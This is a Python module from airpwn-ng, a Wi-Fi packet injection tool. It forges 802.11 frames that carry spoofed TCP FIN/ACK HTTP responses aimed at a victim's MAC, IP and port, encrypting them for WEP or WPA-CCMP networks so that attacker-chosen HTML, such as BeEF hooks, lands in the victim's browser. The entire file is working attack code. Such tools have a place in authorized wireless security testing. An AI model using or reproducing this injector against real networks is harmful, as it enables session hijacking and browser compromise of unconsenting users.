import fcntl, socket, struct, sys, time
from binascii import unhexlify
from pyDot11 import *
from scapy.config import * ## Need to scope down at some point in the future
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.packet import Padding, Raw
from scapy.sendrecv import sendp
from scapy.sendrecv import __gen_send as gs
from scapy.utils import wrpcap


class Injector(object):
    """Uses scapy to inject packets on the networks"""

    def __init__(self, interface, args):
        self.interface = interface
        self.args = args
        self.injSocket = conf.L2socket(iface = interface)

        ## Create a header that works for encrypted wifi having FCS
        ### These bytes can be switched up, if memory serves, this is a channel 6 RadioTap()
        rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
        self.rTap = RadioTap(unhexlify(rTap.replace(' ', '')))

    def inject(self,
               vicmac,
               rtrmac,
               vicip,
               svrip,
               vicport,
               svrport,
               acknum,
               seqnum,
               injection,
               TSVal,
               TSecr):
        """Send the injection using Scapy

        This method is where the actual packet is created for sending
        Things such as payload and associated flags are genned here

        FIN/ACK flag is sent to the victim with this method
        """

        ## HTML headers
        headers = 'HTTP/1.1 200 OK\r\n'
        headers += 'Date: ' + time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime()) + '\r\n'
        headers += 'Server: Apache\r\n'
        headers += 'Content-Length: ' + str(len(injection)) + '\r\n'
        headers += 'Connection: close\r\n'
        headers += 'Content-Type: text/html\r\n'
        headers += '\r\n'

        ## WEP/WPA
        if self.args.wep or self.args.wpa:
            packet = self.rTap\
                    /Dot11(
                          FCfield = 'from-DS',
                          addr1 = vicmac,
                          addr2 = rtrmac,
                          addr3 = rtrmac,
                          subtype = 8L,
                          type = 2
                          )\
                    /Dot11QoS()\
                    /LLC()\
                    /SNAP()\
                    /IP(
                       dst = vicip,
                       src = svrip
                       )\
                    /TCP(
                        flags = 'FA',
                        sport = int(svrport),
                        dport = int(vicport),
                        seq = int(seqnum),
                        ack = int(acknum)
                        )\
                    /Raw(
                        load = headers + injection
                        )
        ## Open
        else:
            packet = RadioTap()\
                    /Dot11(
                          FCfield = 'from-DS',
                          addr1 = vicmac,
                          addr2 = rtrmac,
                          addr3 = rtrmac
                          )\
                    /LLC()\
                    /SNAP()\
                    /IP(
                       dst = vicip,
                       src = svrip
                       )\
                    /TCP(
                        flags = 'FA',
                        sport = int(svrport),
                        dport = int(vicport),
                        seq = int(seqnum),
                        ack = int(acknum)
                        )\
                    /Raw(
                        load = headers + injection
                        )

        if TSVal is not None and TSecr is not None:
            packet[TCP].options = [
                                  ('NOP', None),
                                  ('NOP', None),
                                  ('Timestamp', ((round(time.time()), TSVal)))
                                  ]
        else:
            packet[TCP].options = [
                                  ('NOP', None),
                                  ('NOP', None),
                                  ('Timestamp', ((round(time.time()), 0)))
                                  ]

        ## WPA Injection
        if self.args.wpa is not None:
            if self.shake.encDict.get(vicmac) == 'ccmp':
                try:
                    self.shake.PN[5] += 1
                except:
                    self.shake.PN[4] += 1
                packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[1],
                                    self.shake.origPkt,
                                    packet,
                                    self.shake.PN,
                                    False) ### DEBUG SET TO FALSE FOR NOW
            else:
                print('[!] airpwn-ng cannot inject TKIP natively\n[!] Injection failed')
                #packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[0],
                                    #self.shake.origPkt,
                                    #packet,
                                    #self.shake.PN,
                                    #True)

            sendp(packet, iface = self.interface, verbose = False)
            # gs(self.injSocket, packet, verbose = False)

        ## WEP Injection
        elif self.args.wep is not None:
            packet = wepEncrypt(packet, self.args.wep)
            sendp(packet, iface = self.interface, verbose = False)
            # gs(self.injSocket, packet, verbose = False)

        ## Open WiFi Injection
        else:
            sendp(packet, iface = self.interface, verbose = False)
            # gs(self.injSocket, packet, verbose = False)
        # wrpcap('outbound.pcap', packet)

        print('[*] Packet injected to {0}'.format(vicmac))

        ## Ought be classed up higher so as not to interfere unless warranted
        ### Single packet exit point
        ### Used for BeEF hook examples and such
        # if self.args.single is True:
        #     print('Single Mode Injection called')
        #     sys.exit(0)
